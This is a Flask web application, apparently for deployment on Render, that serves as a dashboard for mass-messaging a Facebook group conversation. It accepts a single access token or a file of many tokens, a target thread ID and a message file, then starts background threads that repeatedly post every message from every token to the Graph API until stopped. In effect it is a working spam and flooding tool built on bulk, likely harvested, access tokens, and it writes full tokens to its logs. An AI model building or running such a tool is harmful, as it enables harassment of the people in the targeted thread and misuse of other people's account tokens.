from flask import Flask, request, render_template_string, redirect, url_for, session, flash
import requests
from threading import Thread, Event
import time
import random
import string
import os
from functools import wraps

app = Flask(__name__)
# Use environment variables for configuration in Render/production
app.debug = os.environ.get('FLASK_DEBUG', 'False').lower() in ('1', 'true', 'yes')
app.secret_key = os.environ.get('SECRET_KEY', 'please-change-this-secret')

# Simple user database (in production, use a proper database)
# Use a single admin user; credentials can be injected via environment variables
users = {
    os.environ.get('ADMIN_USER', 'ammar'): os.environ.get('ADMIN_PASSWORD', 'change_me')
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (compatible; AmmarBot/1.0)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

stop_events = {}
threads = {}


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{mn} {message1}"
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        app.logger.info(f"Message sent from token {access_token}: {message}")
                    else:
                        app.logger.warning(f"Send failed ({response.status_code}) from token {access_token}: {response.text}")
                except Exception as e:
                    app.logger.exception(f"Exception sending message: {e}")
                time.sleep(time_interval)


# Common professional UI templates (kept inline for simplicity)
LOGIN_TEMPLATE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ammar Admin - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
      body { background-color: #f5f7fa; }
      .brand { font-weight: 700; color: #0d6efd; }
      .card { border-radius: 12px; box-shadow: 0 6px 18px rgba(18, 38, 63, 0.08); }
      .footer { font-size: 0.85rem; color: #6c757d; }
    </style>
  </head>
  <body class="d-flex align-items-center min-vh-100">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-md-6 col-lg-5">
          <div class="text-center mb-4">
            <h1 class="brand">Ammar</h1>
            <p class="text-muted">Secure Conversation Management</p>
          </div>

          <div class="card p-4">
            {% with messages = get_flashed_messages() %}
              {% if messages %}
                <div class="alert alert-danger" role="alert">{{ messages[0] }}</div>
              {% endif %}
            {% endwith %}
            <form method="post">
              <div class="mb-3">
                <label for="username" class="form-label">Username</label>
                <input type="text" class="form-control" id="username" name="username" required placeholder="Admin username">
              </div>
              <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" class="form-control" id="password" name="password" required placeholder="Password">
              </div>
              <button type="submit" class="btn btn-primary w-100">Sign in</button>
            </form>
          </div>

          <div class="text-center mt-3 footer">
            <div>Default admin user: <code>{{ default_user }}</code></div>
            <small>In production, set ADMIN_USER and ADMIN_PASSWORD environment variables.</small>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ammar - Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
      body { background-color: #f5f7fa; }
      .card { border-radius: 12px; box-shadow: 0 6px 18px rgba(18, 38, 63, 0.06); }
      .header { display:flex; justify-content:space-between; align-items:center; margin-bottom: 1rem; }
      .brand { font-weight: 700; color: #0d6efd; }
      .small-muted { color: #6c757d; }
    </style>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm mb-4">
      <div class="container">
        <a class="navbar-brand brand" href="#">Ammar</a>
        <div>
          <span class="me-2">Signed in as <strong>{{ session.username }}</strong></span>
          <a href="/logout" class="btn btn-outline-secondary btn-sm">Sign out</a>
        </div>
      </div>
    </nav>

    <div class="container">
      <div class="row">
        <div class="col-lg-8">
          <div class="card p-4 mb-3">
            <div class="header">
              <div>
                <h5 class="mb-0">Send Messages</h5>
                <div class="small-muted">Dispatch messages to a group conversation using access tokens</div>
              </div>
            </div>
            <form method="post" enctype="multipart/form-data">
              <div class="mb-3">
                <label class="form-label">Token option</label>
                <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()">
                  <option value="single">Single token</option>
                  <option value="multiple">Upload token file</option>
                </select>
              </div>
              <div class="mb-3" id="singleTokenInput">
                <label class="form-label">Access token</label>
                <input class="form-control" name="singleToken" placeholder="Enter single token">
              </div>
              <div class="mb-3" id="tokenFileInput" style="display:none;">
                <label class="form-label">Token file (one token per line)</label>
                <input class="form-control" type="file" name="tokenFile">
              </div>

              <div class="row">
                <div class="col-md-6 mb-3">
                  <label class="form-label">Thread ID</label>
                  <input class="form-control" name="threadId" required placeholder="Target thread id">
                </div>
                <div class="col-md-6 mb-3">
                  <label class="form-label">Sender name</label>
                  <input class="form-control" name="kidx" required placeholder="Sender display name">
                </div>
              </div>

              <div class="mb-3">
                <label class="form-label">Time interval (seconds)</label>
                <input class="form-control" type="number" min="1" name="time" value="2">
              </div>

              <div class="mb-3">
                <label class="form-label">Message file (one message per line)</label>
                <input class="form-control" type="file" name="txtFile" required>
              </div>

              <button class="btn btn-primary">Start Task</button>
            </form>
          </div>

          <div class="card p-4 mb-3">
            <h6 class="mb-3">Stop Task</h6>
            <form method="post" action="/stop">
              <div class="mb-3">
                <label class="form-label">Task ID</label>
                <input class="form-control" name="taskId" placeholder="Task ID to stop" required>
              </div>
              <button class="btn btn-danger">Stop</button>
            </form>
          </div>
        </div>

        <div class="col-lg-4">
          <div class="card p-4 mb-3">
            <h6>Active Tasks</h6>
            <ul class="list-group list-group-flush">
              {% for tid in active_tasks %}
                <li class="list-group-item">{{ tid }}</li>
              {% else %}
                <li class="list-group-item text-muted">No active tasks</li>
              {% endfor %}
            </ul>
          </div>

          <div class="card p-4">
            <h6>Notes</h6>
            <p class="small-muted">For production on Render, use the Procfile with Gunicorn: <code>web: gunicorn main:app</code></p>
            <p class="small-muted">Store secrets using environment variables: SECRET_KEY, ADMIN_USER, ADMIN_PASSWORD.</p>
          </div>
        </div>
      </div>

      <footer class="mt-4 text-center small text-muted">© {{ year }} Ammar</footer>
    </div>

    <script>
      function toggleTokenInput(){
        const v = document.getElementById('tokenOption').value;
        document.getElementById('singleTokenInput').style.display = v === 'single' ? 'block' : 'none';
        document.getElementById('tokenFileInput').style.display = v === 'multiple' ? 'block' : 'none';
      }
    </script>
  </body>
</html>
"""


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = (request.form.get('username') or '').strip()
        password = request.form.get('password') or ''
        if username and username in users and users[username] == password:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('send_message'))
        flash('Invalid username or password')
    return render_template_string(LOGIN_TEMPLATE, default_user=list(users.keys())[0])


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/', methods=['GET', 'POST'])
@login_required
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = []
        if token_option == 'single':
            single = (request.form.get('singleToken') or '').strip()
            if single:
                access_tokens = [single]
        else:
            token_file = request.files.get('tokenFile')
            if token_file:
                try:
                    access_tokens = token_file.read().decode().strip().splitlines()
                except Exception:
                    access_tokens = []

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx') or ''
        try:
            time_interval = max(1, int(request.form.get('time') or 2))
        except ValueError:
            time_interval = 2

        txt_file = request.files.get('txtFile')
        messages = []
        if txt_file:
            try:
                messages = txt_file.read().decode().splitlines()
            except Exception:
                messages = []

        if not access_tokens or not thread_id or not messages:
            flash('Please provide tokens, thread id and message file')
            return render_template_string(DASHBOARD_TEMPLATE, active_tasks=list(stop_events.keys()), year=time.localtime().tm_year)

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        thread.daemon = True
        threads[task_id] = thread
        thread.start()
        flash(f'Task started with ID: {task_id}')

    return render_template_string(DASHBOARD_TEMPLATE, active_tasks=list(stop_events.keys()), year=time.localtime().tm_year)


@app.route('/stop', methods=['POST'])
@login_required
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        stop_events.pop(task_id, None)
        threads.pop(task_id, None)
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'


# Health endpoint for platform healthchecks
@app.route('/health')
def health():
    return 'OK', 200


if __name__ == '__main__':
    # For development only. In production Render you should run with gunicorn (Procfile included).
    port = int(os.environ.get('PORT', 5000))
    app.logger.info(f"Starting development server on 0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)
